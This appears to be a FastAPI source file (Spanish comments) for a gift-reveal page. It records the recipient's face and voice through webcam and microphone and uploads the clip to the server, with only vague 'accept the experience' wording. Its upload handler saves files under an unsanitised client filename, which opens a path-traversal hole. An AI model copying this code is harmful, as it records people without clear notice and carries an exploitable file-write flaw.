import os
from pathlib import Path
from fastapi import FastAPI, UploadFile, File
from fastapi.responses import HTMLResponse
from fastapi.staticfiles import StaticFiles

app = FastAPI()

# carpeta para guardar reacciones
Path("reacciones").mkdir(exist_ok=True)

# carpeta static (pon aquí tus imágenes)
app.mount("/static", StaticFiles(directory="static"), name="static")


# =========================
# PANTALLA ETERNA
# =========================

@app.get("/pedido/{order_id}", response_class=HTMLResponse)
def ver_eterna(order_id: str):
    return f"""
<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>ETERNA</title>

<style>
body {{
    margin:0;
    background:black;
    font-family: Arial;
}}

.pantalla {{
    position: fixed;
    width:100%;
    height:100%;
    overflow:hidden;
}}

.fondo {{
    position:absolute;
    width:100%;
    height:100%;
    object-fit:cover;
    filter: brightness(0.4);
}}

.contenido {{
    position:relative;
    z-index:2;
    text-align:center;
    top:50%;
    transform:translateY(-50%);
    color:white;
    padding:20px;
}}

button {{
    margin-top:20px;
    padding:15px 25px;
    font-size:16px;
    background:white;
    color:black;
    border:none;
}}

video {{
    position:fixed;
    bottom:10px;
    right:10px;
    width:120px;
    border-radius:10px;
    opacity:0.7;
}}
</style>
</head>

<body>

<!-- INICIO -->
<div id="inicio" class="pantalla">

    <img src="/static/eterna_inicio.jpg" class="fondo">

    <div class="contenido">
        <h1>Tu ETERNA está aquí</h1>

        <p>
        Al continuar, aceptas vivirla tal y como fue creada.<br>
        Solo ocurre una vez.
        </p>

        <button onclick="iniciarExperiencia()">Aceptar ETERNA</button>
    </div>

</div>


<!-- FINAL -->
<div id="final" class="pantalla" style="display:none;">

    <img src="/static/eterna_final.jpg" class="fondo">

    <div class="contenido">
        <h1>Este momento ya es tuyo</h1>

        <p>
        Puedes guardarlo o compartirlo.
        </p>

        <button onclick="guardarVideo()">Guardar momento</button>
        <button onclick="compartirVideo()">Compartir momento</button>
    </div>

</div>


<video id="preview" autoplay muted></video>

<script>

let mediaRecorder;
let chunks = [];
let videoBlob;

async function iniciarExperiencia() {{
    try {{
        const stream = await navigator.mediaDevices.getUserMedia({{
            video: true,
            audio: true
        }});

        document.getElementById("preview").srcObject = stream;

        mediaRecorder = new MediaRecorder(stream);

        mediaRecorder.ondataavailable = e => chunks.push(e.data);

        mediaRecorder.onstop = () => {{
            videoBlob = new Blob(chunks, {{ type: "video/webm" }});
            subirVideo();
            mostrarFinal();
        }};

        mediaRecorder.start();

        // 2s antes del regalo
        setTimeout(() => {{
            mostrarRegalo();
        }}, 2000);

    }} catch(e) {{
        alert("No puedes ver ETERNA sin aceptar la experiencia completa");
    }}
}}

function mostrarRegalo() {{
    const div = document.createElement("div");
    div.style.position = "fixed";
    div.style.top = "50%";
    div.style.left = "50%";
    div.style.transform = "translate(-50%, -50%)";
    div.style.color = "white";
    div.innerHTML = "<h1>💸 Has recibido un regalo</h1>";

    document.body.appendChild(div);

    // cortar 10s después
    setTimeout(() => {{
        mediaRecorder.stop();
    }}, 10000);
}}

function subirVideo() {{
    const formData = new FormData();
    formData.append("video", videoBlob, "reaccion.webm");

    fetch("/subir-reaccion", {{
        method: "POST",
        body: formData
    }});
}}

function mostrarFinal() {{
    document.getElementById("inicio").style.display = "none";
    document.getElementById("final").style.display = "block";
}}

function guardarVideo() {{
    const url = URL.createObjectURL(videoBlob);
    const a = document.createElement("a");
    a.href = url;
    a.download = "eterna.webm";
    a.click();
}}

async function compartirVideo() {{
    if (navigator.share) {{
        const file = new File([videoBlob], "eterna.webm", {{ type: "video/webm" }});

        await navigator.share({{
            title: "Mi ETERNA",
            text: "Mira este momento ❤️",
            files: [file]
        }});
    }} else {{
        alert("Compartir no disponible en este dispositivo");
    }}
}}

</script>

</body>
</html>
"""


# =========================
# SUBIR REACCIÓN
# =========================

@app.post("/subir-reaccion")
async def subir_reaccion(video: UploadFile = File(...)):
    file_path = Path("reacciones") / video.filename

    with open(file_path, "wb") as f:
        f.write(await video.read())

    return {"ok": True}
